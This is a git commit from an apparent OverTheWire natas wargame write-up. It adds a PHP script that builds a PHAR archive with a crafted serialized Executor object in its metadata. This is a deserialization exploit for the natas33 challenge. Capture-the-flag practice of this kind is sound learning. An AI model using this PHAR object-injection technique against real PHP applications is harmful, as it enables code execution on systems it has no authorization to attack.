69f2be55846436d192572dd591ba637584fce767
MohitR1999 <mohitr1999@gmail.com>
2024-10-15 20:46:16 +0530

    Added writeup till the final level, natas34

---
+++ scripts/natas33/generate_phar.php
@@ -0,0 +1,18 @@
+<?php
+    class Executor{
+        private $filename = "payload.php";
+        private $signature = True;
+        private $init = false;
+    }
+    
+    $phar = new Phar('natas.phar');
+    $phar->startBuffering();
+    $phar->addFromString('test.txt', 'text');
+    $phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+    $object = new Executor();
+    $object->data = 'rips';
+    $phar->setMetadata($object);
+    $phar->stopBuffering();
+
+?>
